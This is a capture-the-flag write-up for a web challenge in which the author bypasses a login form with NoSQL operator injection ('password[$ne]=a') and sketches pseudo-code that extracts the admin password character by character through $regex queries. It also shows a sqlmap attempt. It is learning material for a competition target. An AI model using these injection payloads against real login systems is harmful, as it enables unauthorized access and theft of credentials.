# Get the admin password! writeup

The challenge is to get the admin password(the flag), as help we have a valid login credential test:test [link to get the admin password.](http://gap.chal.ctf.westerns.tokyo/login.php)

Let's begin to fire up burp suite and ispect the HTTP traffic.

```
POST /login.php HTTP/1.1
Host: gap.chal.ctf.westerns.tokyo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gap.chal.ctf.westerns.tokyo/login.php
Cookie: PHPSESSID=1fkfqnd5bldo58srnviecig305
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

user=test&password=test
```
3 possible parameter to try _injection_ : **PHPSESSID**, **user** and **password**.
And 2 possible approach:

* SQLi
* NoSQLI

#### SQLi
Start `pirate$ sqlmap -r tosqli(The POST Request above) --dbs (Try different level and econding)` and... _Nothing_!

#### NoSQLi

Spend some time in fuzzing hope to raise some error, but nothing... 
Next step: Try password with condition!!!

From the Sequencer:
```
POST /login.php HTTP/1.1
Host: gap.chal.ctf.westerns.tokyo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gap.chal.ctf.westerns.tokyo/login.php
Cookie: PHPSESSID=1fkfqnd5bldo58srnviecig305
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

user=admin&password[$ne]=a
```
Explained: Login is successful if password is not equal($ne) to a

The response:

```
You are admin.
The flag is admin password. Admin password format is "TWCTF{...}". 
```

Ok, now run a simple script that guess every single char until '}'(end of flag).

The naif algo(pseudo-code) O(n) and very slow(about 10' on my PC):
```
flag=""

while True:
	for guess in range(!...}): # the charset
		
		# Login if password[$regex]=^+flag+guess
		if request(flag+guess):
			flag += guess
			
			if guess == '}':
				quit()
			else:
				break 
```

My alternative is to use a Binary(Dicotomic)Search to improve the Search O(log(n)) and less than 3'.
The intuition is to use the $lt(lower than) or $gt(greater than) to restrict the window of the char to guess in the charset; look at `nosqli.py` to see the implementation. 









